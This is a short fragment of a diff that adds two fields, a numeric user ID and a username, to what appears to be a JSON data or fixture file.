+      "User_ID": 4448634577,
+      "Username": "paAmfong"
     }
   }
 }
